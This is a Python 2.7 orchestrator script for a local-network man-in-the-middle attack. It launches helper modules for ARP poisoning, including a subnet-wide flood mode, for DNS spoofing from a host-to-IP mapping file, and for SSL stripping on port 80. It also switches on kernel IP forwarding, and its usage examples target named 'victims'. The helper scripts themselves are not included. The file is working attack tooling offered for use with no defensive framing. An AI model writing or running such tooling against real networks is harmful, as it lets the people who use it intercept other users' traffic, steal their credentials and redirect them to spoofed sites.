#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
# mitm_toolbox27.py  –  orchestrator for:
#     • arp.py      (ARP poisoning, Py-2.7)
#     • dns.py      (DNS spoof / relay, Py-2.7)
#     • sslstrip.py (HTTP→HTTPS stripper, Py-2.7)
#
# Author: demo build 2024-06
#

from __future__ import print_function, absolute_import

import argparse
import os
import signal
import subprocess
import sys
import textwrap

# --------------------------------------------------------------------------- #
# helper script locations (same folder)

BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
SCRIPT_ARP = os.path.join(BASE_DIR, "arp.py")
SCRIPT_DNS = os.path.join(BASE_DIR, "dns.py")
SCRIPT_SSL = os.path.join(BASE_DIR, "ssl.py")

PY2 = "python2"          # explicit interpreter for children

# --------------------------------------------------------------------------- #
class Child(object):
    """Keep track of a launched helper; run each in its own process group."""

    def __init__(self, argv):
        # put child into a new pgid, so we can SIGINT the whole subtree
        self.proc = subprocess.Popen(argv, preexec_fn=os.setsid)

    def stop(self):
        try:
            os.killpg(self.proc.pid, signal.SIGINT)
        except OSError:
            pass

    def wait(self):
        try:
            self.proc.wait()
        except KeyboardInterrupt:
            pass

# --------------------------------------------------------------------------- #
def discover_gateway():
    """Return default-gateway IPv4 string or None (Linux only)."""
    try:
        with open("/proc/net/route") as fh:
            for line in fh.readlines()[1:]:
                parts = line.split()
                if parts[1] == "00000000":
                    gw_raw = parts[2]
                    gw = ".".join(str(int(gw_raw[i:i + 2], 16))
                                  for i in (6, 4, 2, 0))
                    return gw
    except IOError:
        pass
    return None

def ensure_ip_forward(auto):
    path = "/proc/sys/net/ipv4/ip_forward"
    if not os.path.exists(path):
        return
    with open(path) as fh:
        if fh.read().strip() == "1":
            return
    if not auto:
        print("[!] Kernel forwarding is OFF – MITM may break "
              "(use --auto-forward to enable automatically).")
        return
    try:
        with open(path, "w") as fh:
            fh.write("1\n")
        print("[*] Enabled net.ipv4.ip_forward = 1")
    except IOError:
        print("[!] Could not enable ip_forward (need root).")
        sys.exit(1)

# --------------------------------------------------------------------------- #
def build_arp_cmd(a, gw):
    if a.arp_mode in ("pair", "silent") and not (a.victims and (a.gateway or gw)):
        return None
    if a.arp_mode == "flood" and not a.cidr:
        return None

    cmd = [PY2, SCRIPT_ARP, "--iface", a.iface,
           "--mode", a.arp_mode,
           "--interval", str(a.interval)]

    if a.arp_mode in ("pair", "silent"):
        cmd += ["--victims", a.victims,
                "--gateway", a.gateway or gw]
    elif a.arp_mode == "flood":
        cmd += ["--cidr", a.cidr]
        if a.gateway or gw:
            cmd += ["--gateway", a.gateway or gw]
    if a.no_restore:
        cmd.append("--no-restore")    # helper must support it
    return cmd

def build_dns_cmd(a):
    if not (a.dns_map or a.dns_relay):
        return None
    cmd = [PY2, SCRIPT_DNS, "-i", a.iface]
    if a.dns_map:
        cmd += ["-m", a.dns_map]
    if a.dns_relay:
        cmd.append("--relay")
    cmd += ["--upstream", a.dns_upstream,
            "--ttl", str(a.dns_ttl)]
    if a.dns_bpf:
        cmd += ["--bpf", a.dns_bpf]
    if a.verbose:
        cmd.append("--verbose")
    elif a.quiet:
        cmd.append("--quiet")
    return cmd

def build_ssl_cmd(a):
    if not a.sslstrip:
        return None
    cmd = [PY2, SCRIPT_SSL, "-i", a.iface]
    if a.verbose:
        cmd.append("--verbose")
    elif a.quiet:
        cmd.append("--quiet")
    return cmd

# --------------------------------------------------------------------------- #
def parse_cli():
    ep = textwrap.dedent("""\
        Examples
        --------
        # ARP pair + DNS spoof file + SSL-strip
        sudo python2 mitm_toolbox27.py -i enp0s10 \
            --victims 10.0.123.4 --gateway 10.0.123.1 \
            --dns-map spoof.yml --sslstrip

        # Flood subnet, relay DNS only
        sudo python2 mitm_toolbox27.py -i wlan0 \
            --arp-mode flood --cidr 10.0.123.0/24 --dns-relay
    """)
    p = argparse.ArgumentParser(
        description="MITM toolbox (Python-2.7 orchestrator)",
        epilog=ep,
        formatter_class=argparse.RawDescriptionHelpFormatter)

    p.add_argument("-i", "--iface", required=True, help="Interface to use")

    # ARP
    p.add_argument("--arp-mode", choices=["pair", "silent", "flood"],
                   default="pair")
    p.add_argument("--victims", help="Victim IPs (pair/silent)")
    p.add_argument("--gateway", help="Gateway IP")
    p.add_argument("--cidr", help="CIDR to flood")
    p.add_argument("--interval", type=float, default=10.0,
                   help="ARP burst interval seconds")
    p.add_argument("--no-restore", action="store_true",
                   help="Skip ARP cache restore on exit")

    # DNS
    p.add_argument("--dns-map", help="YAML host→IP mapping file")
    p.add_argument("--dns-relay", action="store_true",
                   help="Relay unmatched queries")
    p.add_argument("--dns-upstream", default="8.8.8.8",
                   help="Upstream DNS for relay")
    p.add_argument("--dns-ttl", type=int, default=300)
    p.add_argument("--dns-bpf", help="Extra BPF for DNS module")

    # SSL-strip flag
    p.add_argument("--sslstrip", action="store_true",
                   help="Enable SSL-stripper on port 80")

    # misc
    p.add_argument("--auto-forward", action="store_true",
                   help="Enable net.ipv4.ip_forward automatically")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("-q", "--quiet",   action="store_true")

    return p.parse_args()

def main():
    args = parse_cli()

    if os.geteuid() != 0:
        print("[!] Must run as root. Abort.")
        sys.exit(1)

    gw_ip = args.gateway or discover_gateway()
    ensure_ip_forward(args.auto_forward)

    children = []

    for builder in (lambda: build_arp_cmd(args, gw_ip),
                    lambda: build_dns_cmd(args),
                    lambda: build_ssl_cmd(args)):
        cmd = builder()
        if cmd:
            print("[*] Launching:", " ".join(cmd))
            children.append(Child(cmd))

    if not children:
        print("[!] Nothing to do – enable at least one module.")
        sys.exit(1)

    # graceful Ctrl-C
    def _sigint(_s, _f):
        print("\n[!] Ctrl-C -> stopping children …")
        for c in children:
            c.stop()
    signal.signal(signal.SIGINT, _sigint)

    for c in children:
        c.wait()

    print("[*] All modules exited – goodbye.")

if __name__ == "__main__":
    main()
